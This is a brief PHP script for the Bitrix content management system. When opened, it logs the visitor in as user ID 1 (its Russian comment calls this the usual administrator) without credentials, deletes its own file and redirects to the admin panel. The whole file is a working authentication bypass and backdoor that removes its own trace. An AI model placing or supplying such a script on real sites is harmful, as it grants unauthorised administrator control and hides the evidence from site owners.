<?php
require($_SERVER['DOCUMENT_ROOT'] . '/bitrix/header.php');
global $USER;
$USER_ID = 1; //зачастую именно он админ
$USER->Authorize($USER_ID); // авторизуем
@unlink(__FILE__); // удаляем файл
LocalRedirect("/bitrix/admin/");
require($_SERVER['DOCUMENT_ROOT'] . '/bitrix/footer.php');
?>
